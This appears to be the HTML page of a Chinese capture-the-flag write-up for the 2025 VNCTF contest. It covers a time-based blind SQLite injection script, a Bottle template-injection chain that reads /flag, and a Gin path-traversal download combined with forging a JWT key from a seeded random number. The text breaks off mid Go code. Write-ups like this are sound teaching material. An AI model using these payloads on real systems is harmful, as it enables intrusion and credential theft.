@@ -1,0 +1,1393 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025vnctf复现 奶龙回家 首先测SQL注入闭合的方式。1&quot;发现回显“账号密码错误！！”，1'发现回显“好像发生了某种错误？？”。到这里可以确诊是sql注入。\n">
+<title>2025vnctf复现</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/2025vnctf%E5%A4%8D%E7%8E%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="2025vnctf复现">
+<meta property='og:description' content="2025vnctf复现 奶龙回家 首先测SQL注入闭合的方式。1&quot;发现回显“账号密码错误！！”，1'发现回显“好像发生了某种错误？？”。到这里可以确诊是sql注入。\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/2025vnctf%E5%A4%8D%E7%8E%B0/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-02-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-02-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/2025vnctf%E5%A4%8D%E7%8E%B0/1.png' />
+<meta name="twitter:title" content="2025vnctf复现">
+<meta name="twitter:description" content="2025vnctf复现 奶龙回家 首先测SQL注入闭合的方式。1&quot;发现回显“账号密码错误！！”，1'发现回显“好像发生了某种错误？？”。到这里可以确诊是sql注入。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/2025vnctf%E5%A4%8D%E7%8E%B0/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#奶龙回家">奶龙回家</a></li>
+    <li><a href="#学生姓名管理系统"><strong>学生姓名管理系统</strong></a></li>
+    <li><a href="#gin">Gin</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/2025vnctf%E5%A4%8D%E7%8E%B0/">
+                <img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/1.png"
+                        
+                        width="2176" 
+                        height="2776" 
+                        loading="lazy"
+                        alt="Featured image of post 2025vnctf复现" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" style="background-color: #2a9d8f; color: #fff;">
+                Wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025vnctf%E5%A4%8D%E7%8E%B0/">2025vnctf复现</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 11, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="2025vnctf复现">2025vnctf复现
+</h1><h2 id="奶龙回家">奶龙回家
+</h2><p>首先测SQL注入闭合的方式。<code>1&quot;</code>发现回显“账号密码错误！！”，<code>1'</code>发现回显“好像发生了某种错误？？”。到这里可以确诊是sql注入。</p>
+<p>由于测试sleep大小写都被fuzz，猜测是sqlite注入，直接时间盲注，爆破账号密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://node.vnteam.cn:44526/login&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">500</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl"> <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
+</span></span><span class="line"><span class="cl"> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span><span class="o">+</span><span class="n">high</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"> <span class="k">while</span><span class="p">(</span><span class="n">low</span><span class="o">&lt;</span><span class="n">high</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;-1&#39;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),</span><span class="si">{0}</span><span class="s2">,1)&gt;&#39;</span><span class="si">{1}</span><span class="s2">&#39;)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#把payload里password换成username打username</span>
+</span></span><span class="line"><span class="cl">   <span class="n">datas</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">     <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">   <span class="p">}</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># print(datas)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">start_time</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">   <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">datas</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">end_time</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">   <span class="n">spend_time</span><span class="o">=</span><span class="n">end_time</span><span class="o">-</span><span class="n">start_time</span>
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">spend_time</span><span class="o">&gt;=</span><span class="mf">0.4</span><span class="p">:</span> <span class="c1">#这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。</span>
+</span></span><span class="line"><span class="cl">     <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">   <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">   <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span><span class="o">+</span><span class="n">high</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">mid</span> <span class="o">==</span><span class="mi">32</span> <span class="ow">or</span> <span class="n">mid</span> <span class="o">==</span><span class="mi">127</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="k">break</span>
+</span></span><span class="line"><span class="cl"> <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">+</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破出用户名是nailong,密码是woaipangmao114514</p>
+<h2 id="学生姓名管理系统"><strong>学生姓名管理系统</strong>
+</h2><p>题目提示单文件框架，python 本体的单文件框架是bottle 框架</p>
+<p>翻阅bottle的开发手册，可以看到他渲染templete的模板引擎叫SimpleTemplate</p>
+<p>有内置模板函数</p>
+<p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250211135359547.png"
+	width="970"
+	height="457"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250211135359547_hu10552848771658574729.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250211135359547_hu9613646215102496681.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250211135359547"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="509px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{setdefault(&#39;a&#39;,&#39;b&#39;)}}
+</span></span><span class="line"><span class="cl">{{a}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250211135521185.png"
+	width="576"
+	height="350"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250211135521185_hu2678659967777356728.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250211135521185_hu5966137113257374547.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250211135521185"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="394px"
+	
+></p>
+<p>对于单行有23的长度限制,这里py3.8之后推出的海象运算符，可以打继承链绕过长度限制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{a:=&#39;&#39;.__class__}}
+</span></span><span class="line"><span class="cl">{{b:=a.__base__}}
+</span></span><span class="line"><span class="cl">{{c:=b.__subclasses__}}
+</span></span><span class="line"><span class="cl">{{d:=c()}}
+</span></span><span class="line"><span class="cl">{{e:=d[154]}}
+</span></span><span class="line"><span class="cl">{{f:=e.__init__}}
+</span></span><span class="line"><span class="cl">{{g:=f.__globals__}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后环境变量里面查找flag就行了</p>
+<p>或者用catch_warnings方法，命令执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{a:=&#39;&#39;.__class__}}
+</span></span><span class="line"><span class="cl">{{b:=a.__base__}}
+</span></span><span class="line"><span class="cl">{{c:=b.__subclasses__}}
+</span></span><span class="line"><span class="cl">{{d:=c()}}
+</span></span><span class="line"><span class="cl">{{e:=d[228]}}
+</span></span><span class="line"><span class="cl">{{f:=e.__init__}}
+</span></span><span class="line"><span class="cl">{{g:=f.__globals__}}
+</span></span><span class="line"><span class="cl">{{z:=&#39;__builtins__&#39;}}
+</span></span><span class="line"><span class="cl">{{h:=g[z]}}
+</span></span><span class="line"><span class="cl">{{i:=h[&#39;op&#39;&#39;en&#39;]}}
+</span></span><span class="line"><span class="cl">{{x:=i(&#34;/flag&#34;)}}
+</span></span><span class="line"><span class="cl">{{y:=x.read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="gin">Gin
+</h2><p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212172254214.png"
+	width="1395"
+	height="851"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212172254214_hu10234025668565693452.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212172254214_hu18159569005081768554.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212172254214"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="393px"
+	
+></p>
+<p>这里普通用户可以上传和下载文件，admin才能eval命令执行</p>
+<p>用了jwt鉴权</p>
+<p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212203443599.png"
+	width="736"
+	height="170"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212203443599_hu7016609212004991604.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212203443599_hu15603503603115848795.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212203443599"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="432"
+		data-flex-basis="1039px"
+	
+></p>
+<p>但这里的随机数是伪随机</p>
+<p>有个download路由可以实现目录穿越下载config目录下的key</p>
+<p><img src="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212203736107.png"
+	width="1028"
+	height="337"
+	srcset="/p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212203736107_hu6082714118077159405.png 480w, /p/2025vnctf%E5%A4%8D%E7%8E%B0/image-20250212203736107_hu17603618750698497680.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250212203736107"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="305"
+		data-flex-basis="732px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">download</span><span class="err">?</span><span class="n">filename</span><span class="o">=../</span><span class="n">config</span><span class="o">/</span><span class="n">key</span><span class="o">.</span><span class="n">go</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">config</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">Key</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="s">&#34;r00t32l&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">Year</span><span class="p">()</span> <span class="kt">int64</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">2025</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就可以获得key了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;math/rand&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">GenerateKey</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">rand</span><span class="p">.</span><span class="nf">Seed</span><span class="p">(</span><span class="mi">2025</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">randomNumber</span> <span class="o">:=</span> <span class="nx">rand</span><span class="p">.</span><span class="nf">Intn</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">key</span> <span class="o">:=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;%03d%s&#34;</span><span class="p">,</span> <span class="nx">randomNumber</span><span class="p">,</span> <span class="s">&#34;r00t32l&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">key</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">GenerateKey</span><span class="p">()</span>
